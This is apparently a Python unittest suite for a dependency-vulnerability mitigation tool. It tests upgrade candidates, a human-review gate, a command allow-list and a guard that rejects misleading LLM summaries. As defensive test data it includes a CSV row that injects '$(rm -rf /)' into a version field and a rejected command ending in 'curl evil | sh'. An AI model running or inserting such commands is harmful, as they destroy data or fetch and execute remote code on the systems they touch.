"""Mitigation candidates + Human Validation Gate: python -m unittest discover -s tests -v"""
from __future__ import annotations

import json
import os
import shutil
import sys
import tempfile
import unittest
from pathlib import Path

os.environ["SCG_OFFLINE"] = "1"
os.environ["SCG_LLM_PROVIDER"] = "none"
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from mitigation_engine import (  # noqa: E402
    CompatibilityRisk, HumanDecisionType, MitigationAction, build_mitigation_options, deterministic_tradeoff_summary,
    is_safe_command, record_human_decision, semver_jump, validate_tradeoff_summary,
)


def build(**kw):
    base = dict(finding_id="F-001", package_name="qs", current_version="6.5.2", risk_score=65, is_production=True)
    base.update(kw)
    return build_mitigation_options(**base)


class CandidateTests(unittest.TestCase):
    def test_semver_jump(self) -> None:
        self.assertEqual(semver_jump("6.5.2", "6.5.3"), "PATCH")
        self.assertEqual(semver_jump("6.5.2", "6.14.0"), "MINOR")
        self.assertEqual(semver_jump("6.5.2", "7.0.0"), "MAJOR")
        self.assertEqual(semver_jump("0.4.0", "0.5.0"), "MAJOR")       # npm caret semantics for 0.x

    def test_safe_patch_is_auto_approved(self) -> None:
        pkg = build(osv_fixed_versions=["6.5.3"], required_fixed_version="6.5.3")
        self.assertFalse(pkg.requires_human_validation)
        top = pkg.candidates[0]
        self.assertEqual((top.semver_jump, top.compatibility_risk, top.fit_score), ("PATCH", CompatibilityRisk.LOW, 100))
        self.assertEqual(pkg.human_validation.decision, HumanDecisionType.APPROVED)
        self.assertEqual(pkg.human_validation.reviewer, "python-policy (auto)")
        self.assertEqual(top.apply_command, "npm install --ignore-scripts --save-exact qs@6.5.3")
        self.assertEqual(top.rollback_command, "npm install --ignore-scripts --save-exact qs@6.5.2")

    def test_gate_major(self) -> None:
        pkg = build(package_name="jsonwebtoken", current_version="0.4.0", osv_fixed_versions=["4.2.2"], required_fixed_version="4.2.2")
        self.assertTrue(pkg.requires_human_validation)
        self.assertIn("MAJOR", pkg.escalation_reasons[0])
        self.assertEqual(pkg.human_validation.decision, HumanDecisionType.PENDING)

    def test_gate_breaking_change_on_called_symbol(self) -> None:
        notes = "## 6.6.0\n- BREAKING CHANGE: `parse` no longer accepts arrays by default\n## 6.5.3\n- fix prototype pollution"
        pkg = build(osv_fixed_versions=["6.6.0"], required_fixed_version="6.6.0", changelog_text=notes, called_symbols=["parse"])
        top = pkg.candidates[0]
        self.assertEqual(top.affects_called_symbols, ["parse"])
        self.assertEqual(top.compatibility_risk, CompatibilityRisk.HIGH)
        self.assertTrue(any("symbols this app calls" in r for r in pkg.escalation_reasons))
        # same notes but the app never calls parse: breaking note lowers fit, no symbol hit
        pkg2 = build(osv_fixed_versions=["6.6.0"], required_fixed_version="6.6.0", changelog_text=notes, called_symbols=["stringify"])
        self.assertEqual(pkg2.candidates[0].affects_called_symbols, [])

    def test_gate_upstream_patch_only(self) -> None:
        pkg = build(ghsa_data={"id": "GHSA-x", "patched_version": None, "upstream_patch_commit": "a" * 40,
                               "commit_url": "https://github.com/ljharb/qs/commit/" + "a" * 40})
        self.assertEqual(pkg.candidates[0].action_type, MitigationAction.APPLY_UPSTREAM_PATCH)
        self.assertTrue(any("upstream patch" in r for r in pkg.escalation_reasons))
        self.assertTrue(pkg.candidates[0].apply_command.startswith("# review first"))

    def test_gate_no_fix_escalates(self) -> None:
        pkg = build()
        self.assertEqual([c.action_type for c in pkg.candidates], [MitigationAction.ESCALATE_FOR_REVIEW])
        self.assertTrue(pkg.requires_human_validation)
        self.assertIn("no automated fix", pkg.escalation_reasons[0])

    def test_gate_close_candidates_and_csv_feed(self) -> None:
        tmp = Path(tempfile.mkdtemp())
        try:
            csv_path = tmp / "advisory_overrides.csv"
            csv_path.write_text("package,current_version,target_version,action,notes\n"
                                "qs,*,6.5.5,UPGRADE_TO_SAFER,platform team approved\n"
                                "qs,*,$(rm -rf /),UPGRADE_TO_SAFER,ignored: not a version\n", encoding="utf-8")
            pkg = build(osv_fixed_versions=["6.5.3"], required_fixed_version="6.5.3", csv_override_path=str(csv_path))
            self.assertEqual({c.source for c in pkg.candidates}, {"OSV_SCANNER", "CSV_FEED"})
            self.assertEqual(len(pkg.candidates), 2)
            self.assertTrue(any("two close candidates" in r for r in pkg.escalation_reasons))
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_dedupe_and_corroboration(self) -> None:
        pkg = build(osv_fixed_versions=["6.5.3"], required_fixed_version="6.5.3",
                    ghsa_data={"id": "GHSA-hrpp", "patched_version": "6.5.3", "source": "github-advisory-api"})
        self.assertEqual(len(pkg.candidates), 1)
        self.assertEqual(pkg.candidates[0].also_reported_by, ["GHSA"])

    def test_partial_fix_penalised(self) -> None:
        pkg = build(osv_fixed_versions=["6.5.3", "6.14.0"], required_fixed_version="6.14.0")
        by_target = {c.target_version_or_ref: c for c in pkg.candidates}
        self.assertFalse(by_target["6.5.3"].fixes_all_advisories)
        self.assertEqual(pkg.recommended_candidate_id, by_target["6.14.0"].candidate_id)

    def test_transitive_commands_follow_parent_ranges(self) -> None:
        blocked = build(osv_fixed_versions=["6.14.0"], required_fixed_version="6.14.0", is_direct=False, parent_specs=["6.5.2"])
        self.assertEqual(blocked.candidates[0].apply_command, "npm pkg set overrides.qs=6.14.0 && npm install --ignore-scripts")
        stale = build(osv_fixed_versions=["6.5.3"], required_fixed_version="6.5.3", is_direct=False, parent_specs=["~6.5.2"])
        self.assertEqual(stale.candidates[0].apply_command, "npm update --ignore-scripts qs")

    def test_contextual_rules(self) -> None:
        moved = build(osv_fixed_versions=["7.0.0"], required_fixed_version="7.0.0", test_only_usage=True)
        self.assertIn(MitigationAction.MOVE_DEPENDENCY, [c.action_type for c in moved.candidates])
        tamper = build(anomaly_type="tamper", artifact_file="package-lock.json")
        self.assertEqual(tamper.candidates[0].action_type, MitigationAction.POINT_TO_TRUSTED_VERSION)
        self.assertFalse(tamper.requires_human_validation)
        typo = build(package_name="reqeusts", current_version="1.0.0", anomaly_type="typosquat", trusted_alternative="requests")
        self.assertEqual({c.action_type for c in typo.candidates},
                         {MitigationAction.BLOCK_UNSAFE_COMPONENT, MitigationAction.POINT_TO_TRUSTED_VERSION})
        img = build(package_name="node", current_version="n/a", anomaly_type="docker_latest_tag", artifact_ref="node:latest", artifact_file="Dockerfile")
        self.assertEqual(img.candidates[0].action_type, MitigationAction.UPDATE_BASE_IMAGE)
        mal = build(anomaly_type="malicious", called_symbols=["parse"])
        self.assertTrue(mal.requires_human_validation)     # removing an imported package breaks called code

    def test_every_command_is_allow_listed(self) -> None:
        for pkg in (build(osv_fixed_versions=["6.5.3", "7.0.0"], required_fixed_version="6.5.3", is_direct=False, parent_specs=["6.5.2"]),
                    build(anomaly_type="workflow_unpinned_action", artifact_ref="actions/checkout@v4", artifact_file=".github/workflows/ci.yml"),
                    build(anomaly_type="docker_untrusted_registry", artifact_ref="evil.io/base:1.0", artifact_file="Dockerfile")):
            for c in pkg.candidates:
                self.assertTrue(is_safe_command(c.apply_command), c.apply_command)
                self.assertTrue(is_safe_command(c.rollback_command), c.rollback_command)
        self.assertFalse(is_safe_command("npm install qs; curl evil | sh"))


class DecisionTests(unittest.TestCase):
    def setUp(self) -> None:
        self.pkg = build(package_name="jsonwebtoken", current_version="0.4.0", osv_fixed_versions=["4.2.2", "9.0.0"],
                         required_fixed_version="4.2.2")

    def test_approve_requires_valid_candidate(self) -> None:
        with self.assertRaises(ValueError):
            record_human_decision(self.pkg, "APPROVED", "arnav", "", "F-001-C99")
        out = record_human_decision(self.pkg, HumanDecisionType.APPROVED, "arnav", "", self.pkg.candidates[0].candidate_id)
        self.assertEqual(out.human_validation.decision, HumanDecisionType.APPROVED)
        self.assertTrue(out.human_validation.decided_at.endswith("Z"))
        self.assertEqual(self.pkg.human_validation.decision, HumanDecisionType.PENDING)   # original untouched

    def test_accept_risk_needs_justification(self) -> None:
        with self.assertRaises(ValueError):
            record_human_decision(self.pkg, "ACCEPTED_RISK", "arnav", "ok")
        out = record_human_decision(self.pkg, "ACCEPTED_RISK", "arnav", "not exposed: internal batch job only")
        self.assertIsNone(out.human_validation.chosen_candidate_id)

    def test_reject_and_reviewer_required(self) -> None:
        with self.assertRaises(ValueError):
            record_human_decision(self.pkg, "REJECTED_ESCALATED", "", "")
        self.assertEqual(record_human_decision(self.pkg, "REJECTED_ESCALATED", "arnav", "").human_validation.decision,
                         HumanDecisionType.REJECTED_ESCALATED)
        with self.assertRaises(ValueError):
            record_human_decision(self.pkg, "PENDING", "arnav", "")
        esc = build()
        with self.assertRaises(ValueError):
            record_human_decision(esc, "APPROVED", "arnav", "", esc.candidates[0].candidate_id)


class SummaryGuardTests(unittest.TestCase):
    def setUp(self) -> None:
        self.pkg = build(package_name="jsonwebtoken", current_version="0.4.0", osv_fixed_versions=["4.2.2", "9.0.0"],
                         required_fixed_version="4.2.2")

    def test_deterministic_summary_passes(self) -> None:
        self.assertEqual(validate_tradeoff_summary(deterministic_tradeoff_summary(self.pkg), self.pkg), [])

    def test_rejections(self) -> None:
        c1 = self.pkg.candidates[0].candidate_id
        self.assertTrue(validate_tradeoff_summary(f"Upgrade to 5.0.1 via {c1}.", self.pkg))            # invented version
        self.assertTrue(validate_tradeoff_summary("Use F-001-C9 instead.", self.pkg))                    # unknown candidate
        self.assertTrue(validate_tradeoff_summary(f"{c1} is fine; no human review is needed.", self.pkg))
        self.assertTrue(validate_tradeoff_summary(f"{c1} upgrades to 4.2.2.", self.pkg, llm_gate_claim=False))
        ok = f"{c1} moves 0.4.0 to 4.2.2, a MAJOR change; human validation is required."
        self.assertEqual(validate_tradeoff_summary(ok, self.pkg), [])


class ApiAndOrchestratorTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.tmp = Path(tempfile.mkdtemp(prefix="scg-mit-"))
        (cls.tmp / "routes").mkdir()
        (cls.tmp / "package.json").write_text(json.dumps({"name": "t", "dependencies": {"jsonwebtoken": "0.4.0"}}), encoding="utf-8")
        (cls.tmp / "server.ts").write_text("import express from 'express'\nimport { login } from './routes/login'\n"
                                           "const app = express()\napp.post('/rest/login', login())\n", encoding="utf-8")
        (cls.tmp / "routes" / "login.ts").write_text("import jwt from 'jsonwebtoken'\nexport function login () {\n"
                                                     "  return (req, res) => jwt.verify(req.body.token, 'k')\n}\n", encoding="utf-8")
        from continuous_monitor import Engine
        from orchestrator import LogBus
        from main import create_app
        from fastapi.testclient import TestClient
        cls.engine = Engine(LogBus(console=False))
        cls.engine.scan(str(cls.tmp), use_llm=False, use_cache=False)
        cls.client = TestClient(create_app(cls.engine, LogBus(console=False), ["testserver"]))

    @classmethod
    def tearDownClass(cls) -> None:
        dec = cls.engine._decision_file(cls.engine.ctx.repo)
        dec.unlink(missing_ok=True)
        shutil.rmtree(cls.tmp, ignore_errors=True)

    def jwt_pkg(self):
        return next(p for p in self.engine.state["mitigations"].values() if p.package_name == "jsonwebtoken")

    def test_scan_builds_gated_package_with_called_symbols(self) -> None:
        pkg = self.jwt_pkg()
        self.assertTrue(pkg.requires_human_validation)     # 0.4.0 -> 4.2.2 is MAJOR
        self.assertIn(pkg.finding_id, self.engine.last_result.mitigations)

    def test_validate_endpoint_and_decision_survives_rescan(self) -> None:
        pkg = self.jwt_pkg()
        r = self.client.post("/api/mitigations/validate", json={"finding_id": pkg.finding_id, "decision": "ACCEPTED_RISK",
                                                                "reviewer": "arnav", "justification": "x"})
        self.assertEqual(r.status_code, 400)
        r = self.client.post("/api/mitigations/validate", json={"finding_id": "F-999", "decision": "REJECTED_ESCALATED",
                                                                "reviewer": "arnav", "justification": ""})
        self.assertEqual(r.status_code, 404)
        r = self.client.post("/api/mitigations/validate", json={"finding_id": pkg.finding_id, "decision": "APPROVED",
                                                                "reviewer": "arnav", "justification": "",
                                                                "chosen_candidate_id": "nope"})
        self.assertEqual(r.status_code, 400)
        r = self.client.post("/api/mitigations/validate", json={"finding_id": pkg.finding_id, "decision": "APPROVED",
                                                                "reviewer": "arnav", "justification": "tested on a branch",
                                                                "chosen_candidate_id": pkg.candidates[0].candidate_id})
        self.assertEqual(r.status_code, 200, r.text)
        self.assertEqual(r.json()["human_validation"]["decision"], "APPROVED")
        self.assertEqual(self.engine.state["decision_log"][-1]["reviewer"], "arnav")
        self.assertTrue(self.engine._decision_file(self.engine.ctx.repo).exists())
        # a fresh scan renumbers findings but keeps the human decision (matched by stable key + action/target)
        self.engine.scan(str(self.tmp), use_llm=False, use_cache=False)
        again = self.jwt_pkg()
        self.assertEqual(again.human_validation.decision, HumanDecisionType.APPROVED)
        self.assertEqual(again.human_validation.reviewer, "arnav")

    def test_llm_summary_guarded(self) -> None:
        from orchestrator import Orchestrator
        pkg = self.jwt_pkg().model_copy(deep=True)
        o = Orchestrator(self.engine.ctx, self.engine.log, use_llm=False)
        c1 = pkg.candidates[0]
        good = {"summary": f"{c1.candidate_id} upgrades 0.4.0 to {c1.target_version_or_ref}, a MAJOR change with HIGH "
                           f"compatibility risk. Human validation is required."}
        o.llm.complete_json = lambda system, messages: good
        o._llm_tradeoff(pkg)
        self.assertEqual(pkg.summary_author, "llm")
        bad = {"summary": "Just upgrade to 99.1.0, it is safe to apply automatically.", "requires_human_validation": False}
        o.llm.complete_json = lambda system, messages: bad
        o._llm_tradeoff(pkg)
        self.assertEqual(pkg.summary_author, "deterministic")
        self.assertTrue(pkg.summary_validation_errors)


if __name__ == "__main__":
    unittest.main()
